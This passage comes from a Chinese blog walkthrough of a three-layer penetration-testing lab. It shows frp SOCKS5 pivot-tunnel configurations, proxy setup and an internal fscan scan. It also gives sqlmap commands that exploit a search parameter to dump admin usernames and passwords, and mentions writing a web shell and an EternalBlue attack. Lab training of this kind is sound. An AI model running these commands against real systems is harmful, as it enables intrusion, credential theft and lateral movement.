+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 192.168.6.142 </span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line">[proxies]</span><br><span class="line">type = tcp</span><br><span class="line">remote_port = 7777</span><br><span class="line">plugin = socks5</span><br><span class="line">local_ip = 192.168.22.11  </span><br><span class="line">local_port= 7777</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="target2"><a href="#target2" class="headerlink" title="target2"></a>target2</h1><h2 id="Proxifier转发代理"><a href="#Proxifier转发代理" class="headerlink" title="Proxifier转发代理"></a>Proxifier转发代理</h2><img src="/2024/04/16/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240411215949154.png" class="" title="image-20240411215949154">
+
+
+
+
+
+<img src="/2024/04/16/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240411220126435.png" class="" title="image-20240411220126435">
+
+
+
+<p>火狐插件</p>
+<img src="/2024/04/16/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240411220230477.png" class="" title="image-20240411220230477">
+
+<p>此时可以进行抓包 和对网站访问</p>
+<img src="/2024/04/16/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240411225413659.png" class="" title="image-20240411225413659">
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.22.130/index.php?r=vul&amp;keyword=1</span><br></pre></td></tr></table></figure>
+
+<h2 id="sqlmap爆数据"><a href="#sqlmap爆数据" class="headerlink" title="sqlmap爆数据"></a>sqlmap爆数据</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://192.168.22.130/index.php?r=vul&amp;keyword=1&quot; -p keyword –dbs</span><br><span class="line">python sqlmap.py -u &quot;http://192.168.22.130/index.php?r=vul&amp;keyword=1&quot; -p keyword -D bagecms –tables</span><br><span class="line">python sqlmap.py -u &quot;http://192.168.22.130/index.php?r=vul&amp;keyword=1&quot; -p keyword -D bagecms -T bage_admin –columns</span><br><span class="line">python sqlmap.py -u &quot;http://192.168.22.130/index.php?r=vul&amp;keyword=1&quot; -p keyword -D bagecms -T bage_admin -C username,password –dump</span><br></pre></td></tr></table></figure>
+
+
+
+<img src="/2024/04/16/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240411225352757.png" class="" title="image-20240411225352757">
+
+<p>登陆</p>
+<img src="/2024/04/16/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240411225618602.png" class="" title="image-20240411225618602">
+
+<h2 id="写入shell"><a href="#写入shell" class="headerlink" title="写入shell"></a>写入shell</h2><img src="/2024/04/16/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240411225937384.png" class="" title="image-20240411225937384">
+
+
+
+<img src="/2024/04/16/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240411225954568.png" class="" title="image-20240411225954568">
+
+
+
+
+
+
+
+<p>获得shell</p>
+<img src="/2024/04/16/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240411230409748.png" class="" title="image-20240411230409748">
+
+
+
+
+
+
+
+<img src="/2024/04/16/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240411230424120.png" class="" title="image-20240411230424120">
+
+
+
+<h1 id="target3"><a href="#target3" class="headerlink" title="target3"></a>target3</h1><h2 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h2><img src="/2024/04/16/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240411231200055.png" class="" title="image-20240411231200055">
+
+
+
+
+
+<img src="/2024/04/16/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240411231210090.png" class="" title="image-20240411231210090">
+
+
+
+
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./fscan -h 192.168.33.33 &gt;1.txt</span><br></pre></td></tr></table></figure>
+
+
+
+<img src="/2024/04/16/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240411231552445.png" class="" title="image-20240411231552445">
+
+
+
+<h2 id="搭建二层代理"><a href="#搭建二层代理" class="headerlink" title="搭建二层代理"></a>搭建二层代理</h2><p>target1 执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frps -c frps.toml</span><br></pre></td></tr></table></figure>
+
+
+
+<p>target2 执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frpc -c frpc.toml</span><br></pre></td></tr></table></figure>
+
+<p><strong>target2 frpc.toml配置</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 192.168.22.11  #target2可以访问的target的网卡IP</span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line">[proxies]</span><br><span class="line">type = tcp</span><br><span class="line">remote_port = 7777</span><br><span class="line">plugin = socks5</span><br><span class="line">local_ip = 192.168.33.128           </span><br><span class="line">local_port= 7777</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>修改proxychains4.conf</strong></p>
+<img src="/2024/04/16/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240411233617055.png" class="" title="image-20240411233617055">
+
+
+
+<img src="/2024/04/16/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240411233804667.png" class="" title="image-20240411233804667">
+
+
+
+<h2 id="永恒之蓝攻击"><a href="#永恒之蓝攻击" class="headerlink" title="永恒之蓝攻击"></a><strong>永恒之蓝攻击</strong></h2></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://example.com">admire@</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2024/04/16/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/">http://example.com/2024/04/16/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">admire@</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/avatar.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.png" target="_blank"><img class="post-qr-code-img" src="/img/wechat.png" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="/img/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="/img/alipay.jpg" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/03/20/ATTCK2/" title="ATTCK2"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">ATTCK2</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.webp" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">admire@</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/c0rr1Y"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">坐地日行八万里，巡天遥看一千河  QQ:2644895923</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E6%8B%93%E6%89%91%E5%9B%BE"><span class="toc-number">1.</span> <span class="toc-text">网络拓扑图</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%9D%E5%A7%8B%E9%85%8D%E7%BD%AE"><span class="toc-number">2.</span> <span class="toc-text">初始配置</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#target1"><span class="toc-number">3.</span> <span class="toc-text">target1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8E%A7%E5%88%B6%E5%99%A8%E5%90%8D%E6%9C%AA%E8%BF%87%E6%BB%A4%E5%AF%BC%E8%87%B4RCE"><span class="toc-number">3.1.</span> <span class="toc-text">控制器名未过滤导致RCE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83%E7%B1%BB-Request-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.2.</span> <span class="toc-text">核心类 Request 远程代码漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BB%BA%E7%AB%8B%E8%B7%AF%E7%94%B1"><span class="toc-number">3.3.</span> <span class="toc-text">建立路由</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0frp%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F"><span class="toc-number">3.4.</span> <span class="toc-text">上传frp进行内网穿透</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#target2"><span class="toc-number">4.</span> <span class="toc-text">target2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Proxifier%E8%BD%AC%E5%8F%91%E4%BB%A3%E7%90%86"><span class="toc-number">4.1.</span> <span class="toc-text">Proxifier转发代理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqlmap%E7%88%86%E6%95%B0%E6%8D%AE"><span class="toc-number">4.2.</span> <span class="toc-text">sqlmap爆数据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%99%E5%85%A5shell"><span class="toc-number">4.3.</span> <span class="toc-text">写入shell</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#target3"><span class="toc-number">5.</span> <span class="toc-text">target3</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">5.1.</span> <span class="toc-text">内网信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%90%AD%E5%BB%BA%E4%BA%8C%E5%B1%82%E4%BB%A3%E7%90%86"><span class="toc-number">5.2.</span> <span class="toc-text">搭建二层代理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%94%BB%E5%87%BB"><span class="toc-number">5.3.</span> <span class="toc-text">永恒之蓝攻击</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/04/16/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/" title="CFS三层靶机">CFS三层靶机</a><time datetime="2024-04-16T11:22:00.000Z" title="发表于 2024-04-16 19:22:00">2024-04-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/03/20/ATTCK2/" title="ATTCK2">ATTCK2</a><time datetime="2024-03-20T00:59:41.000Z" title="发表于 2024-03-20 08:59:41">2024-03-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/03/20/ATTCK4/" title="ATTCK4">ATTCK4</a><time datetime="2024-03-20T00:55:17.000Z" title="发表于 2024-03-20 08:55:17">2024-03-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/03/12/ATTCK1/" title="ATTCK1">ATTCK1</a><time datetime="2024-03-12T06:56:15.000Z" title="发表于 2024-03-12 14:56:15">2024-03-12</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/03/10/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86%E8%AF%A6%E8%A7%A3/" title="网络代理详解">网络代理详解</a><time datetime="2024-03-10T14:23:24.000Z" title="发表于 2024-03-10 22:23:24">2024-03-10</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By admire@</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>
